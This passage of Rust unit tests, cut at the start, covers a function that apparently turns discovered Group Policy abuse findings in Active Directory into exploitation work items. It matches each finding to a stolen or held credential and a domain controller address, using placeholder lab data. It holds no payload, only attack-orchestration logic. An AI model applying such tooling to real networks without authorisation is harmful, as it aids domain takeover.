            Some("192.168.58.10".into())
        })
        .expect("happy path must build work");

        assert_eq!(work.vuln_id, "vuln-gpo-001");
        assert_eq!(work.dedup_key, "gpo_abuse:vuln-gpo-001");
        assert_eq!(work.source_user, "alice");
        assert_eq!(
            work.gpo_id.as_deref(),
            Some("{6AC1786C-016F-11D2-945F-00C04fB984F9}")
        );
        assert_eq!(work.gpo_name.as_deref(), Some("Default Domain Policy"));
        assert_eq!(work.domain, "contoso.local");
        assert_eq!(work.dc_ip.as_deref(), Some("192.168.58.10"));
        assert!(work.credential.is_some());
    }

    #[test]
    fn try_build_gpo_work_skips_non_gpo_vuln() {
        let mut vuln = vuln_with(json!({"source": "alice", "domain": "contoso.local"}));
        vuln.vuln_type = "esc1".into();
        assert!(try_build_gpo_work(&vuln, &[alice_cred()], false, false, |_| None).is_none());
    }

    #[test]
    fn try_build_gpo_work_skips_already_exploited() {
        let vuln = vuln_with(json!({"source": "alice", "domain": "contoso.local"}));
        assert!(try_build_gpo_work(&vuln, &[alice_cred()], true, false, |_| None).is_none());
    }

    #[test]
    fn try_build_gpo_work_skips_already_processed() {
        let vuln = vuln_with(json!({"source": "alice", "domain": "contoso.local"}));
        assert!(try_build_gpo_work(&vuln, &[alice_cred()], false, true, |_| None).is_none());
    }

    #[test]
    fn try_build_gpo_work_skips_when_source_missing() {
        let vuln = vuln_with(json!({"gpo_id": "x", "domain": "contoso.local"}));
        assert!(try_build_gpo_work(&vuln, &[alice_cred()], false, false, |_| None).is_none());
    }

    #[test]
    fn try_build_gpo_work_skips_when_no_credential_for_source() {
        let vuln = vuln_with(json!({"source": "bob", "domain": "contoso.local"}));
        // No matching credential — alice doesn't match "bob".
        assert!(try_build_gpo_work(&vuln, &[alice_cred()], false, false, |_| None).is_none());
    }

    #[test]
    fn try_build_gpo_work_credential_match_is_case_insensitive() {
        let vuln = vuln_with(json!({"source": "ALICE", "domain": "CONTOSO.LOCAL"}));
        let work = try_build_gpo_work(&vuln, &[alice_cred()], false, false, |_| {
            Some("192.168.58.10".into())
        });
        assert!(work.is_some(), "credential match must ignore case");
    }

    #[test]
    fn try_build_gpo_work_credential_match_when_vuln_domain_empty() {
        // Empty domain on the vuln → match purely on username.
        let vuln = vuln_with(json!({"source": "alice"}));
        let work = try_build_gpo_work(&vuln, &[alice_cred()], false, false, |_| None);
        assert!(
            work.is_some(),
            "empty vuln domain should still match credential by username"
        );
    }

    #[test]
    fn try_build_gpo_work_dc_ip_lookup_returns_none_propagates() {
        let vuln = vuln_with(json!({"source": "alice", "domain": "contoso.local"}));
        let work = try_build_gpo_work(&vuln, &[alice_cred()], false, false, |_| None)
            .expect("missing DC IP must still produce work — second-stage handles it");
        assert!(work.dc_ip.is_none());
    }

    #[test]
    fn try_build_gpo_work_gpo_id_fallback_chain() {
        // Primary key
        let v1 =
            vuln_with(json!({"source": "alice", "domain": "contoso.local", "gpo_id": "primary"}));
        let w1 = try_build_gpo_work(&v1, &[alice_cred()], false, false, |_| None).unwrap();
        assert_eq!(w1.gpo_id.as_deref(), Some("primary"));

        // Fallback to gpo_guid
        let v2 =
            vuln_with(json!({"source": "alice", "domain": "contoso.local", "gpo_guid": "guid"}));
        let w2 = try_build_gpo_work(&v2, &[alice_cred()], false, false, |_| None).unwrap();
        assert_eq!(w2.gpo_id.as_deref(), Some("guid"));

        // Fallback to object_id
        let v3 =
            vuln_with(json!({"source": "alice", "domain": "contoso.local", "object_id": "obj"}));
        let w3 = try_build_gpo_work(&v3, &[alice_cred()], false, false, |_| None).unwrap();
        assert_eq!(w3.gpo_id.as_deref(), Some("obj"));
    }

    #[test]
    fn try_build_gpo_work_gpo_name_fallback_to_display_name() {
        let v = vuln_with(json!({
            "source": "alice",
            "domain": "contoso.local",
            "gpo_display_name": "Workstation Lockdown",
        }));
        let w = try_build_gpo_work(&v, &[alice_cred()], false, false, |_| None).unwrap();
        assert_eq!(w.gpo_name.as_deref(), Some("Workstation Lockdown"));
    }
}
